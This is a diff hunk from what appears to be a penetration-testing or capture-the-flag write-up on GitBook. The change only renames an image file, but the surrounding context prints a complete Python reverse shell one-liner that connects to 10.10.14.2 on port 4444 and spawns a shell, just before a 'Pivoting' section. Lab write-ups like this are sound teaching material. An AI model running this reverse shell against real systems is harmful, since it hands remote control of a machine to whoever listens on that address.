@@ -78,7 +78,7 @@ We can use this reverse shell command:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (110) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (110) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Pivoting
 
